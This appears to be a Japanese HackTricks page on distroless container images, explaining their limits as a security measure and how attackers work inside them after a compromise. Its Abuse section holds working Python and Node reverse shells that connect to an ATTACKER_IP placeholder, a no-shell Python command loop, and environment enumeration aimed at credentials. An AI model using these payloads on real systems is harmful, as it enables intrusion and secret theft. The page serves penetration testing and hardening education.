# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## 概要

**distroless** container image は、**特定の1つのアプリケーションを実行するために必要な最小限の runtime components**だけを含み、package manager、shell、大規模な汎用 userland utilities など、通常の distribution tooling を意図的に削除した image です。実際には、distroless images には application binary または runtime、shared libraries、certificate bundles、そして非常に小さな filesystem layout だけが含まれていることが多くあります。

distroless が新しい kernel isolation primitive という意味ではありません。distroless は **image design strategy** です。container filesystem **内部**で利用可能なものを変えるのであって、kernel が container をどのように isolate するかを変えるものではありません。この違いは重要です。distroless は主に、code execution を取得した後に attacker が利用できるものを減らすことで environment を harden します。namespaces、seccomp、capabilities、AppArmor、SELinux、その他の runtime isolation mechanism の代替にはなりません。

## Distroless が存在する理由

Distroless images は主に、以下を減らすために使用されます。

- image size
- image の operational complexity
- vulnerabilities を含む可能性のある packages と binaries の数
- attacker がデフォルトで利用できる post-exploitation tools の数

そのため、distroless images は production application deployments で popular です。shell、package manager、そしてほぼすべての汎用 tooling を含まない container は、通常、operational に把握しやすく、compromise 後に interactive に abuse されにくくなります。

よく知られた distroless-style image families の例には、以下があります。

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless が意味しないこと

distroless container は **以下を意味しません**。

- 自動的に rootless になる
- 自動的に non-privileged になる
- 自動的に read-only になる
- 自動的に seccomp、AppArmor、または SELinux によって保護される
- 自動的に container escape から安全になる

distroless image を `--privileged`、host namespace sharing、dangerous bind mounts、または mounted runtime socket とともに実行することは依然として可能です。その場合、image は minimal であっても、container は依然として壊滅的に insecure になり得ます。distroless が変えるのは **userland attack surface** であり、**kernel trust boundary** ではありません。

## Typical Operational Characteristics

distroless container を compromise したとき、最初に気づくのは、一般的な前提が通用しなくなっていることです。`sh`、`bash`、`ls`、`id`、`cat` が存在しない場合があり、場合によっては、普段の tradecraft が想定するように動作する libc-based environment すら存在しません。これは offense と defense の両方に影響します。tooling が不足しているため、debugging、incident response、post-exploitation の方法が異なるものになるからです。

最も一般的な pattern は以下のとおりです。

- application runtime は存在するが、それ以外はほとんど存在しない
- shell がないため、shell-based payloads が失敗する
- helper binaries がないため、一般的な enumeration one-liners が失敗する
- read-only rootfs や writable tmpfs locations 上の `noexec` など、filesystem protections も存在することが多い

この組み合わせが、通常、人々が "weaponizing distroless" について話すきっかけになります。

## Distroless And Post-Exploitation

distroless environment における主な offensive challenge は、必ずしも initial RCE ではありません。多くの場合、その後に何が起こるかが問題になります。Python、Node.js、Java、Go などの language runtime で code execution が可能な workload を exploit した場合、arbitrary logic を実行できる可能性はあります。しかし、他の Linux targets で一般的な、通常の shell-centric workflows は利用できません。

そのため、post-exploitation は多くの場合、次の3つの方向のいずれかに移行します。

1. **既存の language runtime を直接使用する**ことで、environment の enumerate、sockets の open、files の read、または追加 payloads の stage を行う。
2. filesystem が read-only である場合、または writable locations が `noexec` として mount されている場合に、**独自の tooling を memory に持ち込む**。
3. application またはその dependencies に予期せず有用なものが含まれている場合、**image 内にすでに存在する binaries を abuse する**。

## Abuse

### すでに存在する Runtime を Enumerate する

多くの distroless containers には shell がありませんが、application runtime は依然として存在します。target が Python service なら Python が存在します。target が Node.js なら Node が存在します。これにより、`/bin/sh` を一度も invoke せずに、files の enumerate、environment variables の read、reverse shells の open、in-memory execution の stage に必要な機能を得られることがよくあります。

Python を使用した簡単な例:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.jsを使った簡単な例:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
影響:

- 環境変数の取得（多くの場合、credentials や service endpoints を含む）
- `/bin/ls` を使用しない filesystem enumeration
- 書き込み可能なパスとマウントされた secrets の特定

### Reverse Shell Without `/bin/sh`

イメージに `sh` または `bash` が含まれていない場合、従来の shell-based reverse shell は直ちに失敗する可能性があります。その場合は、インストール済みの language runtime を使用します。

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh` が存在しない場合は、最後の行を Python による直接的なコマンド実行、または Python REPL ループに置き換えます。

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
繰り返しになりますが、`/bin/sh` が存在しない場合は、shell を起動する代わりに Node の filesystem、process、networking API を直接使用します。

### Full Example: No-Shell Python Command Loop

イメージに Python はあるものの、shell がまったく存在しない場合は、単純な対話型ループだけで完全な post-exploitation capability を維持できることがよくあります。
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
これは対話型 shell binary を必要としません。攻撃者の観点では、その影響は基本的な shell と実質的に同じです。つまり、既存の runtime を介した command execution、enumeration、さらなる payload の staging が可能です。

### メモリ内でのTool実行

Distroless images は、以下と組み合わせて使用されることがよくあります。

- `readOnlyRootFilesystem: true`
- `/dev/shm` のような writable だが `noexec` の tmpfs
- package management tools の不足

この組み合わせにより、従来の「binary を disk に download して実行する」workflow は信頼性が低くなります。そのような場合、memory execution techniques が主要な手段になります。

その専用ページはこちらです。

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

そこで最も関連性の高い techniques は次のとおりです。

- scripting runtimes を介した `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image 内にすでに存在する Binaries

一部の Distroless images には、compromise 後に有用となる、運用上必要な binaries が含まれています。繰り返し確認される例として `openssl` があります。これは、applications が crypto または TLS 関連の tasks で必要とする場合があるためです。

簡単な search pattern は次のとおりです。
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
`openssl` が存在する場合、以下に利用できる可能性があります。

- outbound TLS connections
- 許可された egress channel 経由でのデータ exfiltration
- encoded/encrypted blobs を介した payload data の staging

具体的な abuse 方法は実際に何がインストールされているかによって異なりますが、一般的な考え方は、distroless が「ツールがまったくない」という意味ではなく、「通常の distribution image よりもはるかに少ないツールしかない」という意味だということです。

## Checks

これらの checks の目的は、image が実際の環境で本当に distroless なのか、また post-exploitation に利用できる runtime または helper binaries が残っているかを確認することです。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
ここで興味深い点:

- shell が存在しなくても、Python や Node などの runtime が存在する場合、post-exploitation は runtime-driven execution に切り替えるべきです。
- root filesystem が read-only で、`/dev/shm` が writable だが `noexec` の場合、memory execution techniques の重要性が高まります。
- `openssl`、`busybox`、`java` などの helper binaries が存在する場合、それらはさらなる access を確立するのに十分な機能を提供できる可能性があります。

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | 設計上、最小限の userland | shell も package manager もなく、application/runtime dependencies のみ | debugging layers、sidecar shells、busybox や tooling のコピーを追加 |
| Chainguard minimal images | 設計上、最小限の userland | package surface を削減し、多くの場合は 1 つの runtime または service に特化 | `:latest-dev` や debug variants の使用、build 中の tools のコピー |
| Kubernetes workloads using distroless images | Pod config に依存 | Distroless が影響するのは userland のみ。Pod security posture は Pod spec と runtime defaults にも依存 | ephemeral debug containers、host mounts、privileged Pod settings の追加 |
| Docker / Podman running distroless images | run flags に依存 | filesystem は最小限だが、runtime security は flags と daemon configuration にも依存 | `--privileged`、host namespace sharing、runtime socket mounts、writable host binds |

重要な点は、distroless が **image property** であり、runtime protection ではないことです。その価値は、compromise 後に filesystem 内で利用可能なものを削減することにあります。

## Related Pages

distroless environments で一般的に必要となる filesystem および memory-execution bypasses:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless workloads にも適用される container runtime、socket、mount abuse:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
